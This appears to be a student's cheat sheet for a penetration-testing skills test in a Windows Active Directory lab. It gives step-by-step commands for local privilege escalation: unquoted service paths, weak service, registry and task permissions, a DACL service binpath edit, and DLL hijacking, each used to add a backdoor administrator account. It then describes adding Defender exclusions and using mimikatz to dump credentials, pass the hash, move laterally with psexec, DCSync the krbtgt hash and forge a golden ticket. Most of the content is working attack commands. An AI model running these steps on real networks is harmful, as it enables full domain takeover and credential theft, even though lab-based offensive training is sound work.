>>> general

1) orientation
> ip's and names (hostname, dc-name, etc.) might be outdated for skills test
> use angry ip scanner if available
> look for services without description
> look for services with unquoted service paths
> look for services running as a named user account
> check "C:\Windows\Tasks Migrated" for weakly named tasks (single word names)
> check "\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc" (imagepath edit)
> use -> accesschk -uwvc "normaluser" * <- (daclsvc)

2) files to download
> bat2exe
> sysinternals suite (contains multiple good tools)
> mimikatz
> mike's dll + C code from OneDrive (if dll hijack)

3) commands
> whoami (check current user in terminal)
> dir (list directory contents)
> net user (see users on machine)
> hostname (local domain name)
> echo %logonserver% (domain controller name)
> echo %path% (check path variables for dll hijack)

4) add user command
> net user Helpdesk L3tm3!n /add && net localgroup administrators Helpdesk /add

__________________________________________________________________________________________
__________________________________________________________________________________________
__________________________________________________________________________________________


>>> privilege escalation methods

1) remote mouse
> click on green icon bottom right
> settings
> under image transfer folder click "Change..."
> click OK if prompted with error
> go to C:\Windows\System32 and type "cmd"
> right click cmd -> open (opens system cmd)
> [add user command]

2) unquoted service path
> open services
> sort by description, so services without a description appear on top
> check if "path to executable:" has spaces and no quotes
> example -> C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
> look for writable directory, for example C:\Program Files\Unquoted Path Service
> services always expect an executable (.exe)
> create folder on desktop
> create batch file (.bat) with "[add user command]"
> place batch file inside folder
> use bat2exe on that folder (run bat2exe from cmd)
> rename to common.exe (for this example ofc)
> place exe in C:\Program Files\Unquoted Path Service
> run service
> net user in cmd to check if user is added
> if not, restart machine, run service and check again
> if you have executable rights, maybe run exe from cmd, who knows

3) weak file permission services
> example from lab: C:\Program Files\File Permissions Service\filepermservice.exe
> "filepermservice.exe" can be renamed
> check steps above to make own exe
> place exe inside C:\Program Files\File Permissions Service
> rename old .exe to whatever
> name your own exe to "filepermservice.exe"
> start service
> net user in cmd to check if user is added

4) weak registry permissions (regsvc)
> open registry editor
> go to \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
> right click on imagepath -> select modify
> edit the value data so it points to an exe you control, or
> with bat2exe you can make a .exe that that adds an administrative user (see the notes above)
> open services
> look for the service that has the modified image path as the "path to executable"
> run the service

5) scheduled task
> "C:\Windows\Tasks Migrated" may contain tasks you can exploit / configure
> example from lab: pinger
> "C:\Windows\Tasks Migrated" contained the task "pinger"
> open task scheduler
> the "tasks migrated" folder shouldn't be in the folder tree
> go to action -> import task
> select "all files" on bottom right
> navigate to "C:\Windows\Tasks Migrated"
> open "pinger" or whatever task looks weak (only one word for example)
> go to triggers and see what triggers it
> go to action to see what it does and what file it triggers (.bat for example)
> check if the file is renamable and if the directory is writable
> rename the file to whatever
> place your own file (add administrative user through a batch file)

> open task in notepad (easier method than opening in task scheduler)

6) DACL service
> go to services
> check if there is a dacl service (daclsvc)
> open cmd
> go to where you stored your sysinternals
> accesschk -uwvc "normaluser" *
> it might say "RW daclsvc" (should mean you have read/write rights for the service actions listed)
> sc config daclsvc binpath="cmd /c cmd.exe /c net user Helpdesk L3tm3!n /add && net localgroup administrators Helpdesk /add"
> run the service
> might have to do the sc command multiple times and run the service again

7) dll hijack
> last resort for privilege escalation
> go to services
> there may be a service that indicates a dll hijack
> go to the properties of the service to see the path and name of the .exe it calls
> copy the .exe to your own machine (drag n drop or shared folder)
> open cmd on own machine
> sc create ServiceName binPath= "C:\temp\name.exe" (insert name of .exe)
> run service you made
> open procmon (from sysinternals) on own machine
> click on filter icon (ctrl+L) and add the following 2 filters:
> [result] [is] [NAME NOT FOUND] -> click add
> [path] [ends with] [.dll] -> click add
> click ok
> click on process name to sort
> if the .exe and its dll have multiple entries (like 5+), the %path% variable might be used
> note down the name of the dll
> go back to the VM and open cmd
> echo %path%
> look if there is a writable directory listed (like C:\temp)
> go back to own machine
> download Mike's dll + C code from OneDrive if not done yet
> note down the the fake admin credentials after opening his C code in notepad
> rename dll to the name you noted down earlier
> copy dll to the VM
> place dll inside the directory you found in %path%
> run service
> net user in cmd to check if it worked

__________________________________________________________________________________________
__________________________________________________________________________________________
__________________________________________________________________________________________


>>> static steps after local priv escalation

1) defender exclusion:
> defender icon on bottom right (or type virus and threat protection in search)
> virus and threat protection
> manage settings
> add or remove exclusions
> use fake admin login (".\" for local account)
> add exclusion (folder)
> select c drive

2) download mimikatz/sysinternals
> store in c:\temp for easy access
> same with sysinternals suite

3) administrator hash
> open cmd with fake admin
> cd C:\temp\mimikatz_trunk\x64
> mimikatz
> privilege::debug
> sekurlsa::logonpasswords
> copy ntlm hash from administrator (session:service from 0)

4) priv escalation
> sekurlsa::pth /user:administrator /domain:win10client /ntlm:hash
> dir \\192.168.56.30\c$ (to double check privilege)
> cd C:\temp\SysinternalsSuite
> psexec -r name \\192.168.56.30 cmd

5) admin machine
> whoami (should be administrator)
> cd C:\
> md temp (create temp dir)
> dir (check if temp directory was created
> powershell
> set-mppreference -exclusionpath C:\temp
> (get-mppreference).exclusionpath -> checks the exluded paths
> exit (exits out of PS)
> cd temp
> type "mimikatz" (do not run yet)

6) copying mimikatz to admin machine
> go to original mimikatz cmd (or open new one)
> sekurlsa::pth /user:administrator /domain:win10client /ntlm:hash
> in the new cmd window
> net use x: \\192.168.56.30\c$
> x:
> cd temp
> get ready to switch to admin window from step 5
> copy C:\temp\mimikatz_trunk\x64\*.* .
> immediately run mimikatz on admin machine
> successful if mimikatz is visible on admin machine

7) grab domain admin hash
> privilege::debug
> sekurlsa::logonpasswords
> copy domain admin hash (should be the first one)
> let teacher know if domain admin (domad) doesn't show up

8) dcsync on domain controller
> close both admin cmd windows (you dont need them anymore)
> go to original mimikatz cmd (or open new one)
> sekurlsa::pth /user:domad /domain:adlab.local ntlm:hash
> dir \\192.168.56.10\c$
> cd C:\temp\SysinternalsSuite
> mimikatz
> privilege::debug
> lsadump::dcsync /domain:adlab.local /all /csv
> copy krbtgt

9) golden ticket
> open a normal cmd windows
> whoami /user - copy everyting except last 4 digits
> go to mimikatz
> kerberos::golden /domain:adlab.local /sid:S-1-5-21-3704816349-2630934885-840893638 /rc4:cc326e8519157da4bf8ef543b8680dc3 /user:abcdef /id:500 /ptt

> or.. save for later
> kerberos::golden /domain:adlab.local /sid:S-1-5-21-3704816349-2630934885-840893638 /rc4:cc326e8519157da4bf8ef543b8680dc3 /user:abcdef /id:500 /ptt
> kerberos::ptt ticket.kirbi
> misc::cmd

> dir \\win2019dc\c$
